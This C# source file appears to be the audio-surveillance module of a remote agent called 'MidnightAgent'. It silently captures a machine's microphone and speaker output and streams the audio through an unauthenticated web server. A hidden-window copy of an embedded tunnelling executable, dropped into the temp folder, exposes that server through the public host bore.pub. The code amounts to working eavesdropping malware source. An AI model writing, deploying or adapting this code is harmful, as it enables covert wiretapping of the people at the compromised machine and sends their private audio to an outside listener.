using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NAudio.Wave;
using SIPSorcery.Net;

namespace MidnightAgent.Helpers
{
    public class VoiceStreamManager : IDisposable
    {
        private HttpListener _listener;
        private WaveInEvent _waveIn;
        private WasapiLoopbackCapture _loopback;
        private int _port = 8080;
        private int _sampleRate = 16000;
        private float _smoothedGain = 1.0f;
        private readonly float _targetLevel = 28000f;
        private readonly float _maxBoost = 8.0f;
        private int _audioSource = 0; // 0: Mic, 1: Speaker, 2: Mixed
        private int _currentBitrate = 128;
        private DateTime _lastDataTime = DateTime.Now;
        private bool _isRestarting = false;
        private bool _isRunning = false;
        private CancellationTokenSource _cts;
        private string _lastPort = "";
        private Process _boreProcess;

        public event Action<string> OnTunnelStatus;

        public bool IsRunning => _isRunning;

        public void Start()
        {
            if (_isRunning) return;
            _isRunning = true;
            _cts = new CancellationTokenSource();

            // 1. Initialize Audio Capture
            StartRecording();

            // 2. Start Web Server
            _listener = new HttpListener();
            // Try to find an available port if 8080 is taken, or just stick to 8080 for simplicity
            _listener.Prefixes.Add($"http://*:{_port}/");
            try
            {
                _listener.Start();
                Console.WriteLine($"[VoiceStream] Web Server started at http://localhost:{_port}/");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[VoiceStream] Error starting web server: {ex.Message}");
                Stop();
                throw;
            }

            // 3. Start Bore Tunnel and Handle Requests
            _ = Task.Run(() => StartBoreTunnel(), _cts.Token);
            _ = Task.Run(() => HandleRequests(), _cts.Token);

            // 4. Watchdog for Audio
            Task.Run(async () =>
            {
                while (!_cts.IsCancellationRequested)
                {
                    await Task.Delay(5000, _cts.Token);
                    if ((DateTime.Now - _lastDataTime).TotalSeconds > 10 && !_isRestarting && _isRunning)
                    {
                        Console.WriteLine("[VoiceStream Watchdog] Audio silence detected, restarting capture...");
                        StartRecording();
                    }
                }
            }, _cts.Token);
        }

        public void Stop()
        {
            if (!_isRunning) return;
            _isRunning = false;
            _cts?.Cancel();

            try { _waveIn?.StopRecording(); _waveIn?.Dispose(); } catch { }
            try { _loopback?.StopRecording(); _loopback?.Dispose(); } catch { }
            try { _listener?.Stop(); _listener?.Close(); } catch { }
            try { if (_boreProcess != null && !_boreProcess.HasExited) _boreProcess.Kill(); } catch { }

            _waveIn = null;
            _loopback = null;
            _listener = null;
            _boreProcess = null;
        }

        private void StartRecording()
        {
            if (_isRestarting) return;
            _isRestarting = true;
            try
            {
                if (_waveIn != null) { try { _waveIn.StopRecording(); _waveIn.Dispose(); } catch { } }
                if (_loopback != null) { try { _loopback.StopRecording(); _loopback.Dispose(); } catch { } }
                Thread.Sleep(500); // Wait for Windows to release devices
            }
            catch { }

            _sampleRate = _currentBitrate * 1000 / 8;

            try
            {
                // 1. Microphone Setup
                _waveIn = new WaveInEvent { WaveFormat = new WaveFormat(_sampleRate, 16, 1), BufferMilliseconds = 30 };
                _waveIn.DataAvailable += (s, e) =>
                {
                    try { if (_audioSource == 0 || _audioSource == 2) ProcessAndSend(e.Buffer, e.BytesRecorded, true); } catch { }
                };
                _waveIn.RecordingStopped += (s, e) => { if (!_isRestarting && e.Exception != null && _isRunning) StartRecording(); };

                // 2. Speaker Loopback Setup
                _loopback = new WasapiLoopbackCapture();
                _loopback.DataAvailable += (s, e) =>
                {
                    try { if (_audioSource == 1 || _audioSource == 2) ProcessLoopback(e.Buffer, e.BytesRecorded); } catch { }
                };
                _loopback.RecordingStopped += (s, e) => { if (!_isRestarting && e.Exception != null && _isRunning) StartRecording(); };

                _waveIn.StartRecording();
                _loopback.StartRecording();
                _lastDataTime = DateTime.Now;
                Console.WriteLine($"[VoiceStream] Audio Active: {_currentBitrate}kbps");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[VoiceStream Audio Error] Failed to start: {ex.Message}");
            }
            _isRestarting = false;
        }

        private void ProcessLoopback(byte[] buffer, int bytesRecorded)
        {
            int channels = _loopback.WaveFormat.Channels;
            int samples = bytesRecorded / (4 * channels);
            byte[] pcmBuffer = new byte[samples * 2];

            for (int i = 0; i < samples; i++)
            {
                float left = BitConverter.ToSingle(buffer, i * 4 * channels);
                float right = channels > 1 ? BitConverter.ToSingle(buffer, i * 4 * channels + 4) : left;
                float mixed = (left + right) / 2f;
                short sample = (short)(mixed * 32767);
                byte[] bytes = BitConverter.GetBytes(sample);
                pcmBuffer[i * 2] = bytes[0];
                pcmBuffer[i * 2 + 1] = bytes[1];
            }
            ProcessAndSend(pcmBuffer, pcmBuffer.Length, false);
        }

        private void ProcessAndSend(byte[] buffer, int bytesRecorded, bool isMic)
        {
            float gain = 1.0f;
            if (isMic)
            {
                short maxAbs = 0;
                for (int i = 0; i < bytesRecorded; i += 2)
                {
                    short abs = Math.Abs(BitConverter.ToInt16(buffer, i));
                    if (abs > maxAbs) maxAbs = abs;
                }
                if (maxAbs > 100)
                {
                    float idealGain = _targetLevel / maxAbs;
                    if (idealGain > _maxBoost) idealGain = _maxBoost;
                    _smoothedGain = (_smoothedGain * 0.9f) + (idealGain * 0.1f);
                }
                gain = _smoothedGain;
            }

            byte[] muLawBuffer = new byte[bytesRecorded / 2];
            for (int i = 0; i < bytesRecorded; i += 2)
            {
                short pcm = BitConverter.ToInt16(buffer, i);
                if (isMic) pcm = (short)Math.Max(-32768, Math.Min(32767, pcm * gain));
                muLawBuffer[i / 2] = NAudio.Codecs.MuLawEncoder.LinearToMuLawSample(pcm);
            }
            _lastDataTime = DateTime.Now;
            OnAudioData?.Invoke(muLawBuffer);
        }

        private event Action<byte[]> OnAudioData;

        private async Task HandleRequests()
        {
            while (_isRunning && _listener.IsListening)
            {
                try
                {
                    var context = await _listener.GetContextAsync();
                    var req = context.Request;
                    var res = context.Response;

                    if (req.IsWebSocketRequest)
                    {
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                HttpListenerWebSocketContext wsContext = await context.AcceptWebSocketAsync(null);
                                var ws = wsContext.WebSocket;
                                var sendQueue = new System.Collections.Concurrent.BlockingCollection<byte[]>();
                                _ = Task.Run(async () =>
                                {
                                    try
                                    {
                                        foreach (var data in sendQueue.GetConsumingEnumerable(_cts.Token))
                                        {
                                            if (ws.State != WebSocketState.Open) break;
                                            await ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Binary, true, CancellationToken.None);
                                        }
                                    }
                                    catch { }
                                });
                                Action<byte[]> handler = (data) => { try { sendQueue.Add(data); } catch { } };
                                OnAudioData += handler;
                                while (ws.State == WebSocketState.Open && _isRunning) await Task.Delay(1000);
                                OnAudioData -= handler;
                                sendQueue.CompleteAdding();
                            }
                            catch { }
                        });
                    }
                    else if (req.HttpMethod == "GET" && req.Url.AbsolutePath == "/source")
                    {
                        string sourceStr = req.QueryString["id"];
                        if (int.TryParse(sourceStr, out int src))
                        {
                            _audioSource = src;
                            Console.WriteLine($"[VoiceStream] Source changed: {(_audioSource == 0 ? "Mic" : _audioSource == 1 ? "Speaker" : "Mixed")}");
                        }
                        res.StatusCode = 200; res.Close();
                    }
                    else if (req.HttpMethod == "GET" && req.Url.AbsolutePath == "/bitrate")
                    {
                        if (int.TryParse(req.QueryString["val"], out int br))
                        {
                            _currentBitrate = br;
                            StartRecording();
                        }
                        res.StatusCode = 200; res.Close();
                    }
                    else
                    {
                        string html = GetIndexHtml();
                        byte[] buffer = Encoding.UTF8.GetBytes(html);
                        res.ContentType = "text/html"; res.OutputStream.Write(buffer, 0, buffer.Length); res.Close();
                    }
                }
                catch { }
            }
        }

        private void StartBoreTunnel()
        {
            Console.WriteLine("[VoiceStream] Establishing Public Tunnel...");
            string borePath = Path.Combine(Path.GetTempPath(), "bore_agent.exe");
            
            // Try to extract bore.exe if it exists in resources, otherwise check local folder
            try
            {
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                string resourceName = assembly.GetManifestResourceNames().FirstOrDefault(n => n.EndsWith("bore.exe"));
                if (resourceName != null)
                {
                    using (Stream s = assembly.GetManifestResourceStream(resourceName))
                    using (FileStream fs = new FileStream(borePath, FileMode.Create)) { s.CopyTo(fs); }
                }
                else
                {
                    // Fallback to local if not in resource
                    string localBore = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "bore.exe");
                    if (File.Exists(localBore)) File.Copy(localBore, borePath, true);
                }
            }
            catch { }

            if (!File.Exists(borePath))
            {
                OnTunnelStatus?.Invoke("ERROR: bore.exe not found.");
                return;
            }

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = borePath,
                Arguments = $"local {_port} --to bore.pub",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            try
            {
                _boreProcess = new Process { StartInfo = psi };
                _boreProcess.OutputDataReceived += (s, e) =>
                {
                    if (string.IsNullOrEmpty(e.Data)) return;
                    var match = System.Text.RegularExpressions.Regex.Match(e.Data, @"(?:remote_port|bore\.pub)[:\s]+(\d+)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                    if (match.Success)
                    {
                        string port = match.Groups[1].Value;
                        if (port == "0" || port == _lastPort) return;
                        _lastPort = port;
                        string url = $"http://bore.pub:{port}";
                        OnTunnelStatus?.Invoke(url);
                    }
                };
                _boreProcess.Start();
                _boreProcess.BeginOutputReadLine();
                _boreProcess.BeginErrorReadLine();
            }
            catch (Exception ex)
            {
                OnTunnelStatus?.Invoke($"Tunnel Exception: {ex.Message}");
            }
        }

        private string GetIndexHtml()
        {
            return @"<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <title>Midnight Voice Streamer</title>
    <style>
        body { margin: 0; background: #020617; color: #f8fafc; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: #0f172a; padding: 3rem; border-radius: 1.5rem; border: 1px solid #1e293b; text-align: center; width: 380px; }
        .badge { display: inline-block; padding: 4px 12px; border-radius: 100px; font-size: 0.7rem; font-weight: 800; margin-bottom: 1rem; }
        .badge-relay { background: #f59e0b; color: #78350f; }
        h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #3b82f6; }
        button { width: 100%; background: #3b82f6; color: #fff; border: none; padding: 1rem; border-radius: 0.75rem; font-weight: 700; cursor: pointer; margin: 1.5rem 0; }
        .status-box { background: #020617; padding: 1rem; border-radius: 1rem; font-family: monospace; font-size: 0.8rem; }
        .source-switch { display: flex; gap: 0.5rem; justify-content: center; margin-top: 1rem; }
        .source-btn { background: #1e293b; color: #94a3b8; border: 1px solid #334155; padding: 0.5rem 1rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.75rem; }
        .source-btn.active { background: #3b82f6; color: #fff; border-color: #3b82f6; }
        .bitrate-btn { background: #422006; color: #fbbf24; border: 1px solid #78350f; padding: 0.4rem 0.8rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.7rem; font-weight: bold; }
        .bitrate-btn.active { background: #f59e0b; color: #000; border-color: #fbbf24; }
        .buffer-btn { background: #064e3b; color: #34d399; border: 1px solid #065f46; padding: 0.4rem 0.8rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.7rem; font-weight: bold; }
        .buffer-btn.active { background: #10b981; color: #064e3b; border-color: #34d399; }
        .reset-btn { background: #450a0a; color: #f87171; border: 1px solid #7f1d1d; padding: 0.5rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.75rem; margin-top: 1rem; width: 100%; font-weight: 800; }
    </style>
</head>
<body>
    <div class='card'>
        <div id='modeBadge' class='badge badge-relay'>RELAY MODE</div>
        <h1>Midnight Voice</h1>
        <div style='font-size: 0.7rem; opacity: 0.5; margin-bottom: 1rem;'>Agent Audio Monitoring</div>
        
        <div style='font-size: 0.7rem; color: #94a3b8; margin-bottom: 0.3rem;'>AUDIO SOURCE</div>
        <div class='source-switch'>
            <button class='source-btn active' onclick='setSource(0, this)'>MIC</button>
            <button class='source-btn' onclick='setSource(1, this)'>SPEAKER</button>
            <button class='source-btn' onclick='setSource(2, this)'>MIXED</button>
        </div>

        <div style='display: flex; gap: 0.5rem; margin-top: 1rem;'>
            <div style='flex: 1;'>
                <div style='font-size: 0.7rem; color: #94a3b8; margin-bottom: 0.3rem;'>QUALITY</div>
                <div style='display: flex; gap: 0.2rem;'>
                    <button class='bitrate-btn' onclick='setBitrate(320, this)'>320K</button>
                    <button class='bitrate-btn active' onclick='setBitrate(128, this)'>128K</button>
                    <button class='bitrate-btn' onclick='setBitrate(64, this)'>64K</button>
                </div>
            </div>
            <div style='flex: 1;'>
                <div style='font-size: 0.7rem; color: #94a3b8; margin-bottom: 0.3rem;'>STABILITY</div>
                <div style='display: flex; gap: 0.2rem;'>
                    <button class='buffer-btn' onclick='setBuffer(0.2, this)'>LOW</button>
                    <button class='buffer-btn active' onclick='setBuffer(0.5, this)'>MED</button>
                    <button class='buffer-btn' onclick='setBuffer(1.0, this)'>HIGH</button>
                </div>
            </div>
        </div>

        <button id='startBtn'>Start Listening</button>
        
        <div class='status-box'>
            <div id='connState'>Status: Idle</div>
            <div id='kbps' style='color:#10b981'>0.0 kbps</div>
        </div>

        <button class='reset-btn' onclick='resetAudio()'>RESET SYNC</button>
    </div>

    <script>
        const startBtn = document.getElementById('startBtn');
        const connState = document.getElementById('connState');
        const kbpsEl = document.getElementById('kbps');
        let audioCtx, ws, nextTime = 0, totalBytes = 0, lastReportTime = Date.now(), currentSR = 16000, targetBuffer = 0.5;
        
        const muLawTable = new Int16Array(256);
        for (let i = 0; i < 256; i++) {
            let mu = ~i, sign = (mu & 0x80), exponent = (mu & 0x70) >> 4, mantissa = (mu & 0x0F);
            let sample = (mantissa << 3) + 132; sample <<= exponent; sample -= 132;
            muLawTable[i] = sign ? -sample : sample;
        }

        const connectWS = () => {
            ws = new WebSocket((location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws');
            ws.binaryType = 'arraybuffer';
            ws.onopen = () => { connState.innerText = 'Status: Connected'; startBtn.innerText = 'Stop'; startBtn.disabled = false; startBtn.onclick = () => location.reload(); };
            ws.onclose = () => { connState.innerText = 'Status: Reconnecting...'; setTimeout(connectWS, 2000); };
            ws.onmessage = async (e) => {
                totalBytes += e.data.byteLength;
                const now = Date.now();
                if (now - lastReportTime > 1000) { kbpsEl.innerText = ((totalBytes * 8) / 1000).toFixed(1) + ' kbps'; totalBytes = 0; lastReportTime = now; }
                const muData = new Uint8Array(e.data);
                const floatData = new Float32Array(muData.length);
                for (let i = 0; i < muData.length; i++) floatData[i] = muLawTable[muData[i]] / 32768.0;
                const buffer = audioCtx.createBuffer(1, floatData.length, currentSR);
                buffer.getChannelData(0).set(floatData);
                const source = audioCtx.createBufferSource();
                source.buffer = buffer;
                const audioNow = audioCtx.currentTime;
                const drift = nextTime - audioNow;
                if (drift > targetBuffer + 0.3) { resetAudio(); return; } 
                if (drift > targetBuffer + 0.1) source.playbackRate.value = 1.15;
                else if (drift > targetBuffer - 0.1) source.playbackRate.value = 1.05;
                source.connect(audioCtx.destination);
                if (nextTime < audioNow) nextTime = audioNow + targetBuffer; 
                source.start(nextTime);
                nextTime += (buffer.duration / source.playbackRate.value);
            };
        };

        startBtn.onclick = async () => {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            await audioCtx.resume();
            startBtn.disabled = true;
            startBtn.innerText = 'Connecting...';
            connectWS();
        };

        const setSource = (id, btn) => {
            fetch('/source?id=' + id);
            document.querySelectorAll('.source-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        };

        const setBitrate = (val, btn) => {
            currentSR = val * 1000 / 8;
            fetch('/bitrate?val=' + val);
            document.querySelectorAll('.bitrate-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            resetAudio();
        };

        const setBuffer = (val, btn) => {
            targetBuffer = val;
            document.querySelectorAll('.buffer-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            resetAudio();
        };

        const resetAudio = async () => {
            nextTime = 0;
            if (audioCtx) { try { await audioCtx.close(); } catch(e) {} audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
        };
    </script>
</body>
</html>";
        }

        public void Dispose()
        {
            Stop();
        }
    }
}
